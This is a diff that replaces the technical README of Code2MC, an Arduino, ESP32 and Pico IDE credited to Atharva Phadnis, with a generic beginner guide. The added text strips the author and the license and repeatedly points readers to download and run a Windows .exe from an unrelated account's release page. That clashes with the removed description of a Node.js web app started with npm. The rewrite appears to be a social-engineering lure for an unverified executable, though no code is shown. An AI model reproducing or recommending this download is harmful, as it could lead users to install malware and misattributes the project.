@@ -1,103 +1,69 @@
-# Code2MC
+# ⚡ code2MC - Write code for electronics with ease
 
-A modern, lightweight Arduino IDE clone with a built-in **Library Manager** and support for **Arduino, ESP32, and Raspberry Pi Pico (RP2040)**.
+[![](https://img.shields.io/badge/Download-Release_Page-blue)](https://github.com/pestilent-puritanism520/code2MC/releases)
 
-Made by **Atharva Phadnis**.
+Code2MC helps you write computer programs for electronics. You can create projects for Arduino, ESP32, and Raspberry Pi Pico boards. This tool keeps your work organized in one window. It handles the difficult part of sending your programs to your hardware. The design focuses on clarity so you can focus on building your devices.
 
----
+## 📥 Getting the software
 
-## ✨ Features
+You need to download the installer from our release page. Visit the link below to see the available versions.
 
-- Monaco-based code editor (VS Code engine) with `.ino` / `.cpp` / `.h` syntax highlighting, dark theme, line numbers, auto-indent
-- File explorer for local sketches (stored under `sketches/`)
-- **Board selector**: Arduino Uno, ESP32 Dev Module, Raspberry Pi Pico
-- **Port selector** with auto-detect (`arduino-cli board list`)
-- **Compile & Upload** using `arduino-cli`
-- **Library Manager** — search / install / list / uninstall libraries
-- **Auto-install missing libraries** when a compile error reports `No such file or directory` for a header
-- Serial-style console output panel
-- Clean dark modern UI
+[Download Code2MC from the release page](https://github.com/pestilent-puritanism520/code2MC/releases)
 
----
+Look for the file that ends in .exe. Click this file to start your download. Your browser might ask you to confirm the location for the file. Save the file to your computer.
 
-## 📦 Requirements
+## 🛠️ Setting up your system
 
-1. **Node.js 18+** — https://nodejs.org
-2. **Arduino CLI** installed and in your `PATH` — https://arduino.github.io/arduino-cli/latest/installation/
+Code2MC works on Windows 10 and Windows 11. Your computer requires at least 4GB of memory. Ensure your computer has a working USB port to connect your hardware boards.
 
-Verify:
-```bash
-arduino-cli version
-```
+1. Open your downloads folder after the download finishes.
+2. Find the file you saved. It will have a code2MC icon.
+3. Double-click this file to start the installer.
+4. Follow the instructions on the screen.
+5. Click the finish button when the progress bar reaches the end.
 
-### Install ESP32 core
-```bash
-arduino-cli core update-index --additional-urls https://raw.githubusercontent.com/espressif/arduino-esp32/gh-pages/package_esp32_index.json
-arduino-cli core install esp32:esp32 --additional-urls https://raw.githubusercontent.com/espressif/arduino-esp32/gh-pages/package_esp32_index.json
-```
+The installer places a shortcut on your desktop. You can open the program by clicking this icon.
 
-### Install Raspberry Pi Pico (RP2040) core
-```bash
-arduino-cli core update-index --additional-urls https://github.com/earlephilhower/arduino-pico/releases/download/global/package_rp2040_index.json
-arduino-cli core install rp2040:rp2040 --additional-urls https://github.com/earlephilhower/arduino-pico/releases/download/global/package_rp2040_index.json
-```
+## 📖 Using the editor
 
-### Install Arduino AVR core
-```bash
-arduino-cli core install arduino:avr
-```
+The main window displays your code. The left side holds your file list. The top menu holds button controls to check and send your code.
 
----
+- **Check Code:** This button looks for errors in your program. If it finds a mistake, it displays a message at the bottom of the screen.
+- **Upload Code:** This button sends your program to your connected electronic board. The software recognizes the board automatically.
+- **Library Manager:** Use this menu to add features to your projects. You can search for components like sensors or displays.
+- **Serial Monitor:** This tool lets your board talk back to your computer. It shows text messages sent from your electronics during operation.
 
-## 🚀 Run
+## 🔌 Connecting your hardware
 
-```bash
-npm install
-npm start
-```
+Connect your board to your computer using a USB cable. Wait a few seconds for Windows to set up the connection. If the board does not appear in the menu, check the cable connection. Ensure you use a cable that supports data transfer. Some cables only charge devices and will not allow the computer to send code.
 
-Open http://localhost:3000
+## ⚙️ Selecting your board
 
----
+Every project needs a board type. Go to the menu bar at the top of the window. Click on the board list. Select the item that matches the hardware you hold in your hand. If you use an Arduino Uno, pick that option from the list. If you use a Raspberry Pi Pico, pick that option. 
 
-## 🧠 Using the Library Manager
+After selecting the board, the software adjusts the settings to match the hardware. You can now write your code. 
 
-1. Click the **Libraries** panel on the right.
-2. Type a query (e.g. `DHT`) and press **Search**.
-3. Click **Install** on any result.
-4. The **Installed** list shows currently installed libraries with an **Uninstall** button.
-5. When compiling, if the CLI reports a missing header, Code2MC will prompt you to auto-install the matching library.
+## 🎈 Creating a new project
 
----
+Click the File menu and select New Project. Give your project a name. The program creates a folder for your project files. This folder keeps your code and settings together. You can save your work using the File menu or the Save icon.
 
-## 🧩 Boards
+## 📝 Writing your first program
 
-| Board | FQBN |
-|---|---|
-| Arduino Uno | `arduino:avr:uno` |
-| ESP32 Dev Module | `esp32:esp32:esp32` |
-| Raspberry Pi Pico | `rp2040:rp2040:rpipico` |
+When you open a new file, you see two main sections. One section prepares the board when you power it on. The other section contains the instructions you want the board to loop over and over.
 
----
+Type your instructions inside these sections. If you make a mistake, use the Undo button to correct it. Keep your instructions simple. If your code exceeds the memory of the board, the compiler will notify you.
 
-## 📁 API
+## ❓ Troubleshooting common issues
 
-| Route | Description |
-|---|---|
-| `GET  /api/boards` | List supported boards |
-| `GET  /api/ports` | Detected serial ports |
-| `POST /api/compile` | `{ code, board, sketchName }` |
-| `POST /api/upload`  | `{ code, board, port, sketchName }` |
-| `GET  /api/lib/search?q=` | Search libraries |
-| `POST /api/lib/install` | `{ name }` |
-| `GET  /api/lib/list` | Installed libraries |
-| `POST /api/lib/uninstall` | `{ name }` |
-| `GET  /api/files` | List sketches |
-| `GET  /api/files/:name` | Read a sketch |
-| `POST /api/files/:name` | Save a sketch |
+If you encounter problems, look at these points first:
 
----
+- **Missing Drivers:** Sometimes the computer needs extra drivers for your board. These usually install automatically.
+- **Wrong Port:** If the upload fails, check the port settings in the menu. Ensure the correct port appears as selected.
+- **Code Errors:** Read the error messages at the bottom of the screen. They often point to the exact line with the issue.
+- **Cable quality:** Swap your USB cable if the board disappears from the list.
 
-## 🪪 License
+## 📄 Licensing information
 
-MIT © Atharva Phadnis
+This project uses an open-source model. You can view the code, report issues, and suggest improvements. We value contributions from the community. You can find all source files in the repository.
+
+Keywords: arduin, arduino-ide, code-upload, developer-tools, electron-app, electronics, embedded-systems, esp32-arduino, ide, nodejs, open-source, raspberry-pi-pico, serial-communication
